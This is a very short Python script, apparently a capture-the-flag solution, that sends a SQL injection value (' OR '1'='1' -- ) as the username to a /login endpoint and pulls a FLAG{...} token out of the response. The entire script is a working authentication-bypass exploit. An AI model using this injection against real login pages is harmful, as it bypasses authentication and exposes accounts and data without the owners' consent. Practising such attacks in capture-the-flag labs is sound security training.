import re
from helper import post

body = post("/login", username="' OR '1'='1' -- ", password="x")
print(re.search(r"FLAG\{[a-z0-9_]+\}", body).group(0))
